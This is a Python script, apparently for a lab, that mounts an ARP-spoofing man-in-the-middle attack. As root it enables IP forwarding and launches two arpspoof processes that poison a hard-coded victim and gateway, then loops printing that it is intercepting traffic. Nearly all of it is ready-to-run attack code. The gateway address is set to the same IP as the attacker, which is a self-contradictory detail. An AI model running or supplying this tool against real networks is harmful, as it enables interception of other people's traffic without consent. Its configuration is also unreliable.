#!/usr/bin/env python3
# ARP Spoofing Script
# MITM Attack - Lab Only
# Author: Hira Islam

import subprocess
import time
import os
import sys

ATTACKER_IP = "10.233.101.49"
VICTIM_IP   = "10.233.105.10"
GATEWAY_IP  = "10.233.101.49"
INTERFACE   = "eth0"

def display_banner():
    print("=" * 40)
    print("  MITM Attack - ARP Spoofing Tool  ")
    print("=" * 40)
    print("Attacker : " + ATTACKER_IP)
    print("Victim   : " + VICTIM_IP)
    print("Gateway  : " + GATEWAY_IP)
    print("=" * 40)

def enable_ip_forward():
    print("[*] Enabling IP Forwarding...")
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    print("[OK] IP Forwarding Enabled!")

def start_arp_spoof():
    print("[*] Starting ARP Spoofing...")
    print("[*] Press Ctrl+C to stop")

    try:
        cmd1 = [
            "arpspoof",
            "-i", INTERFACE,
            "-t", VICTIM_IP,
            GATEWAY_IP
        ]
        cmd2 = [
            "arpspoof",
            "-i", INTERFACE,
            "-t", GATEWAY_IP,
            VICTIM_IP
        ]

        print("[*] Poisoning Victim...")
        print("[*] Poisoning Gateway...")
        print("[*] MITM Active!")

        p1 = subprocess.Popen(cmd1)
        p2 = subprocess.Popen(cmd2)

        while True:
            print("[*] Intercepting... " + time.strftime("%H:%M:%S"))
            time.sleep(5)

    except KeyboardInterrupt:
        print("[*] Stopping...")
        p1.terminate()
        p2.terminate()
        print("[OK] Attack Stopped!")

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("[ERROR] Run as root!")
        sys.exit(1)
    display_banner()
    enable_ip_forward()
    start_arp_spoof()
